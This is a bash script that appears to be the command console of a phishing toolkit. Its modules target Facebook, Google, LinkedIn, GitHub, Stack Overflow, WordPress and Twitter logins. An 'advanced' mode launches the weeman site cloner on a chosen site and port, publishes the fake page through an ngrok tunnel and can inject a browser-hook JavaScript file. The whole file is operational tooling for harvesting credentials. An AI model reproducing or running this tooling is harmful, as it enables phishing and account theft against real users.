#!/bin/bash
normal='\e[0m'
arr[0]='\e[1;94m' ; blue=${arr[0]}
arr[1]='\e[1;31m' ; red=${arr[1]}
arr[2]='\e[1;33m' ; yellow=${arr[2]}
arr[3]='\e[1;35m' ; purp=${arr[3]}
arr[4]='\e[1;32m' ; green=${arr[4]}
arr[5]='\e[97m'   ; white=${arr[5]}
grayterm='\e[1;40m'

module=$(echo $1 | cut -d '/' -f 2 )
if [[ $module != "fb" ]] && [[ $module != "google" ]] && [[ $module != "in" ]]  && [[ $module != "git" ]]  && [[ $module != "stack" ]]  && [[ $module != "wp" ]]  && [[ $module != "twitter" ]] && [[ $module != "advanced" ]]  ; then
   echo -e "${red}[x] Wrong module name"
   exit
fi   

misc(){
    if [[ $1 == "back" ]] || [[ $1 == "exit" ]] || [[ $1 == "quit" ]] ; then
        exit
    elif [[ $1 == '!' ]] ; then
        $2
    elif [[ $1 == "clear" ]] || [[ $1 == "reset" ]] ; then
        clear   
    elif [[ $1 == "help" ]] || [[ $1 == "?" ]] ; then
        bash ../print_help_modules.sh help 
    elif [[ $1 == "banner" ]] ; then
        rand="$[ $RANDOM % 6 ]"
        color="${arr[$rand]}" # select random color
        echo -e $color
        python ../print_banner.py    
    elif [[ $1 == "" ]] ; then
        :             
    else
       echo -e "${purp}[-] Invalid parameter use show 'help' for more information"         
    fi    
}
site="https://facebook.com"
ngrok_url="on"
port="80"
js="nul"

while IFS= read -e -p "$( echo -e $white ; echo -e ${grayterm}{REBEL}➤[${white}$1]~#${normal} ) " cmd1 ; do
    history -s "$cmd1"
	if [[ $( echo $cmd1 | cut -d " " -f 1 ) == "show" ]] ; then
       if [[ $( echo $cmd1 | cut -d " " -f 2 ) == "options" ]] ; then

          if [[ $module == "advanced" ]] ; then
             {
             echo -e '  Option\t\t\t\t|Value'
             echo -e '  ======\t\t\t\t|====='
             echo -e "  site\t\t\t\t|$site|[http(s)://site.com]"
             echo -e "  port\t\t\t\t|$port"
             echo -e "  js\t\t\t\t|$js|[http://192.168.1.10/hook.js]"            
	           echo -e "  ngrok\t\t\t\t|$ngrok_url|[on/off]"
             } | column -t -s "|"  
          else
             {
             echo -e '  Option\t\t\t\t|Value'
             echo -e '  ======\t\t\t\t|====='
             } | column -t -s "|"                           
          fi  
       elif [[ $( echo $cmd1 | cut -d " " -f 2 ) == "modules" ]] ; then
          bash ../print_help_modules.sh modules
       elif [[ $( echo $cmd1 | cut -d " " -f 2 ) == "help" ]] ; then
          bash ../print_help_modules.sh help
       fi
  elif [[ $( echo $cmd1 | cut -d " " -f 1 ) == "set" ]] ; then
       if  [[ $( echo $cmd1 | cut -d " " -f 2 ) == "site" ]] ; then
           site="$( echo $cmd1 | cut -d " " -f 3- )"
           if ! [[ $site  =~ "http" ]] ; then
              site="http://${site}"
           fi
       elif [[ $( echo $cmd1 | cut -d " " -f 2 ) == "port" ]] ; then
           port=$( echo $cmd1 | cut -d " " -f 3- )   
       elif [[ $( echo $cmd1 | cut -d " " -f 2 ) == "ngrok" ]] ; then
           ngrok_url=$( echo $cmd1 | cut -d " " -f 3- )   
       elif [[ $( echo $cmd1 | cut -d " " -f 2 ) == "js" ]] ; then
           js=$( echo $cmd1 | cut -d " " -f 3- )   
       fi           
  elif [[ $( echo $cmd1 | cut -d " " -f 1 ) == 'run' ]] ; then
       if [[ $module == "fb" ]] ; then
           echo -e "1\n2" | python main.py 
       elif [[ $module == "google" ]] ; then
           echo -e "2\n2" | python main.py   
       elif [[ $module == "in" ]] ; then
           echo -e "3" | python main.py 
       elif [[ $module == "git" ]] ; then
           echo -e "4" | python main.py 
       elif [[ $module == "stack" ]] ; then
           echo -e "4" | python main.py 
       elif [[ $module == "wp" ]] ; then
           echo -e "6" | python main.py 
       elif [[ $module == "twitter" ]] ; then
           echo -e "7" | python main.py 
       elif [[ $module == "advanced" ]] ; then
           if [[ $ngrok_url == "on" ]] ; then
              ./Server/ngrok ./ngrok http $port > /dev/null & 
              sleep 10 
              ngrok=$( curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh )
              cd weeman_mod
              if [[ $js == "nul" ]] ; then
                  python weeman.py $site $port $ngrok 2> /dev/null 
              else
                  python weeman.py $site $port $ngrok $js 2> /dev/null
              fi    
           else
              cd weeman_mod
              if [[ $js == "nul" ]] ; then
                  python weeman.py $site $port 2> /dev/null
              else
                  python weeman.py $site $port $js 2> /dev/null
              fi  
           fi   
       fi
    else
       misc $cmd1
    fi   
done    
